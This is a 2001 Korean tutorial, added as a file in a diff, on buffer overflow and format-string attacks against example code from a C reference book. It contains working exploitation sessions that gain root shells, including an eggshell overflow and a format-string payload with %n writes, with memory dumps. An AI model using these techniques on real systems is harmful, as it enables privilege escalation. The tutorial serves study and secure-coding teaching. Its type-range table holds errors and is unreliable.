@@ -1,0 +1,236 @@
+ =======================================================================================================
+ Title : 예제공략을 통한 Overflow & Format string 
+ Author : 유동훈 (Xpl017Elz)
+ E-mail : szoahc@hotmail.com
+ Home: http://x82.i21c.net
+ Date : 2001/10/12
+ =======================================================================================================
+
+ 작자주: 이 문서는 Overflow & Format string attack을 공부하는 이들을 위해 제작되었습니다. 
+ 만약, 문서의 내용중 오류가 있다면 szoahc@hotmail.com으로 mail 주시면 감사하겠습니다.
+
+ =======================================================================================================
+
+ 참고 자료:
+
+ * All Data Types in the proposed ANSI standard
+
+ Type                   Bit widthª     Rangeª
+
+ char                        8      ASCII characters
+ unsigned char               8      0 to 255
+ signed char                 8      -128 to 127 
+ int                        16      -32768 to 32767
+ unsigned int               16      0 to 65535
+ signed int                 16      -32768 to 32767
+ short int                   8      -128 to 127
+ unsigned short int          8      0 to 255
+ signed short int            8      -128 to 127
+ long int                   32      -2147483648 to 2147483649
+ signed long int            32      -2147483648 to 2147483649
+ unsigned long int          32      0 to 4294967296
+ float                      32      Approximately 6 digits of precision
+ double                     64      Approximately 12 digits of precision
+ long double               128      Approximately 24 digits of precision
+
+ ªcited widths and ranges assume a 16-bit word
+
+ =======================================================================================================
+ 입력함수 scanf, gets Overflow 추가내용 및 1989년도 C언어 번역서중 첨부된 내용입니다.
+ ※ 참고로 공격자의 해설은 앞부분에 '>'로 표기하여 구분하였음을 알려드립니다.
+ =======================================================================================================
+
+ strcpy() 함수
+
+ #include <string.h>
+ char *strcpy(str1,str2);
+ char *str1, *str2;
+
+ 서 술
+
+ 함수 strcpy()는 str2의 내용을 str1으로 copy하는데 사용된다.
+ 요소 str2는 NULL 종결된 string으로의 포인터가 틀림없다.
+ 함수는 포인터를 str2로 반송한다.
+ 만약 str1과 str2가 겹쳐지면, strcpy()의 행위가 정의되지 않는다.
+
+ 예 제
+
+ 다음 코드는 사용자에게로부터 입력받은 값을 string str1로 copy하는 source이다.
+
+ char str1[80];
+ strcpy(str1,argv[1]);
+
+ 관련 함수: strchr(), strcmp(), memcpy(), strncmp()
+
+ > 위의 예제는 Overflow 취약점이 존재한다. 80byte를 넘김으로써 반환주소를 변경할수 있는것이다.
+ > 참고로, 위의 내용중에서 "만약 str1과 str2가 겹쳐지면, strcpy()의 행위가 정의되지 않는다." 라는 부분이
+ > 그 사실을 증명하고 있다. 단, 프로그램상의 결과만을 생각한것이다.
+
+ strncat() 함수
+
+ #include <string.h>
+ char *strncat(str1,str2,count);
+ char *str1, *str2;
+ unsigned int count;
+
+ 서 술
+ 
+ 함수 strncat()은 str2가 지적한 string의 count 문자들보다 많지 않게 str1이 지적한 string으로 연결하고,
+ NULL과 함께 str1을 종결시킨 NULL 종결자는 str2의 첫번째 문자에 의해서 겹쳐쓰인다.
+ string str2는 손상되지 않는다. 함수는 str1을 반송한다.
+ 
+ 기 억: 범위체크가 일어나지 않으므로, str1이 그것의 원래 내용들과 str2의 원래 내용들을 유지하기에
+ 충분히 크다는것을 보장하는것은 프로그래머의 책임이다.
+
+ 예 제
+
+ 다음 예제 프로그램은 stdin으로부터 읽혀진 첫번째 string을 두번째 string에 첨부하고, 
+ 발생부터 str1까지 배열의 Overflow를 막는다. 예를 들어 사용자가 hello와 there을 입력한다 가정하면
+ 프로그램은 therehello를 출력한다.
+
+ #include <string.h>
+
+ main() { 
+ char s1[80], s2[80];
+ unsigned int len;
+ gets(s1); gets(s2);
+ len = 79 - strlen(s2);
+ strncat(s2,s1,len);
+ printf(s2);
+ }
+
+ 관련 함수: strnchr(), strncmp(), strncpy(), strcat()
+
+ > 작자의 말대로 Overflow를 방지하기위해 머리를 쓴건 사실인것 같다. 하지만,
+ > gets() 함수가 입력을 받는부분에서 체크를 하지않는 다는점을 생각치 못한것같다. 위의 말대로라면
+ > Overflow가 일어나지 않아야 한다. 
+
+ [root@xpl017elz /tmp]# ./strncat
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+ xxxxxxxxxxxxxxxxxxxxxxx
+ Segmentation fault 
+ [root@xpl017elz /tmp]#
+ 
+ > gets() 함수덕분에 배열의 Overflow가 일어나게 된것이다.
+ > 다음은 간단히 eggshell을 통해 shell을 띄우는것이다.
+
+ [root@xpl017elz /tmp]# gcc -o eggshell eggshell.c && ./eggshell
+ Using address: 0xbffffb68
+ [root@xpl017elz /tmp]# (echo $RET;cat) | ./strncat
+ 
+ id
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ whoami
+ root     
+
+ > 쉽게 shell을 띄우는데 성공하였다.
+
+ > "len = 79 - strlen(s2);" 부분이 무용지물이 되는것은 또 한가지있다.
+ > 위의 Source가 89년도에 제작되었다는점을 감안한다면 지나칠수있는 문제지만, 출력하는 부분에서
+ > format string을 사용하지 않고 s2 변수를 그대로 출력한다.
+ > 즉, format string 취약점에 노출되있는것이다.
+
+ [root@xpl017elz /tmp]# ./strncat
+ ZZZZ%x%x%x%x%x%x%x%x%x%x
+ AAAA%x%x%x%x%x%x%x%x%x%x
+ AAAA374141414178257825782578257825782578257825782578255a5a5a5a7825782578257825ZZ
+ ZZ7825782578257825782578254010640018808049638bffff1a040009fad400103c7
+ [root@xpl017elz /tmp]# 
+
+ > 이 또한, 약간의 작업으로 간단히 shell을 띄울수있다. 
+ > gdb 작업을 통해 return address가 0xbffff1cc란것을 얻는다.
+ > 또한, shellcode가 띄워져있는 address를 16진수로 계산한다. (0x) (bfff): 64356 (fb64): 50331
+ > 그후, exploit을 통해 다음과 같은 format string을 구성하였다. 
+ > (s2에 덧붙어질 s1부분 공격. 즉, stack의 아래부분)
+ 
+ [root@xpl017elz /tmp]# (printf "\x82\x82\x82\x82\xcc\xf1\xff\xbf\x82\x82\x82\x82\xce
+ \xf1\xff\xbf%%8x%%64332c%%n%%50331c%%n";cat)|./strncat
+
+ > 공 격
+ 
+ id
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ exit 
+ 
+ > shell을 띄우는데 성공하였다.
+ > dumpcode를 이용한 예제:
+                                                                           ?xb
+ ffff128  82 82 82 82 cc f1 ff bf 82 82 82 82 ce f1 ff bf   ................
+ 0xbffff138  25 38 78 25 36 34 33 33 32 63 25 6e 25 35 30 33   %8x%64332c%n%503
+ 0xbffff148  33 31 63 25 6e 00 10 40 6c f1 ff bf 0a 04 07 40   31c%n..@l......@
+ 0xbffff158  8c 64 10 40 88 01 00 00 00 00 00 00 88 98 04 08   .d.@............
+ 0xbffff168  a0 f1 ff bf ad 9f 00 40 c7 03 01 40 38 2e 01 40   .......@...@8..@
+ 0xbffff178  82 82 82 82 cc f1 ff bf 82 82 82 82 ce f1 ff bf   ................
+ 0xbffff188  25 38 78 25 36 34 33 33 32 63 25 6e 25 35 30 33   %8x%64332c%n%503
+ 0xbffff198  33 31 63 25 6e 00 02 40 c8 f1 ff bf 20 a1 00 40   31c%n..@.... ..@
+ 0xbffff1a8  eb 68 0f 40 9c 97 04 08 10 a6 00 40 14 f2 ff bf   .h.@.......@....
+ 0xbffff1b8  c8 f1 ff bf 8b 84 04 08 88 97 04 08 9c 97 04 08   ................
+ 0xbffff1c8  e8 f1 ff bf 64 fb ff bf 01 00 00 00 14 f2 ff bf   ....d...........
+ 0xbffff1d8  1c f2 ff bf 24 20 01 40 01 00 00 00 f0 83 04 08   ....$ .@........
+ 0xbffff1e8  00 00 00 00 11 84 04 08                           ........          
+
+ > s1영역 s2영역이 확연히 구분된다. 여기서, Return address가 0xbffffb64로 정확히 변경된것을 볼수있다.
+ > 이로써 프로그램 버그를 막기위한 위의 예제를 무력화 해보았다.
+ 
+ > 몇 페이지를 넘기다보니 또 하나의 예제가 있었다.
+ > "배열 범위 오버플로우가 일어나지 않는다는것을 확신하라"? 라는 문구의 글을 담은 예제였다.
+
+ strncpy() 함수
+
+ #include <stdio.h>
+ char *strncpy(str1,str2,count);
+ char *str1, *str2;
+
+ 서 술
+
+ 함수 strncpy()는 count 문자들에 따라서 str2가 지적한 string으로 부터 str1이 지적한 string으로
+ copy하는데 사용된다. 요소 str2는 NULL 종결된 string으로의 포인터이어야 한다.
+ 함수는 포인터를 str1으로 반송한다.
+ 만약 str1과 str2가 겹쳐지면, strncpy() 함수의 행위는 정의되지 않는다. 만약 str2가 지적한 string이
+ count 문자들보다 더 적게 포함한다면, count 문자들이 copy할때까지 NULL 문자들이 str1의 끝에 첨부된다.
+
+ 양자택일로, 만약 str1가 지적한 string이 count 문자들보다 더 길다면 str1이 지적한 결과적인 
+ string은 NULL 종결되지 않는다.
+
+ 예 제
+
+ 다음의 코드단면은 str1의 최대 79개의 문자를 str2로 copy한다.
+ 그래서 배열 범위 오버플로우가 일어나지 않는다는것을 확신하라.
+
+ char str1[128], str2[80];
+ gets(str1);
+ strncpy(str2,str1,79);
+
+ 관련 함수: strchr(), strncmp(), memcpy(), strncat()
+
+ > 위의 source도 마찬가지이다. gets() 함수의 입력부분에서 배열 범위 오버플로우를 일으키므로,
+ > 오버플로우가 일어나는것을 피할수없다.
+ > 위의 eggshell을 이미 띄운 상태이다.
+
+ [root@xpl017elz /tmp]# (echo $RET;cat)|./strncpy
+ id
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ whoami
+ root
+ exit
+ [root@xpl017elz /tmp]#     
+
+ > :-)
+ 
+ > 결 론
+
+ > 프로그래밍을 안전하게 구현하기 위해선 string 관련함수의 사용을 신중히 고려해봐야 할것이다.
+ > 뿐만아니라, 입력함수 부분에선 항상 배열 범위의 오버플로우를 지니고 있어 매우 위험하다.
+ > 이는, C언어상에서 따로 바운스체크(함수의 경계값체크) 작업을 거치지 않기때문에 발생하는 치명적인 문제인것이다.
+ > 참고로 Boundary를 점검하는 함수는 fgets(), strncpy(), strncat() 등이 있고, 
+ > 점검하지 않는 함수들은 strcat(), strcpy(), gets(), sprintf(), scanf() 등이 있다. 
+
+ > 여러분은 위의 사항들을 공부하였으므로, 더이상의 프로그래밍상의 실수는 없으리라 생각한다.
+ > 비록, 성능이 낮아질지라도 취약점이 없는 프로그램을 개발한다면, 그것만큼 훌륭한 프로그램은 없다.
+
+ > 그런, 훌륭한 프로그램을 개발하는것이 프로그래머들의 사명이 아닐까(?) 생각한다. :-p
+
+ 참고 자료: C언어 해설번역서 # The Complete Reference (저 자: Herbert Schildt)
+
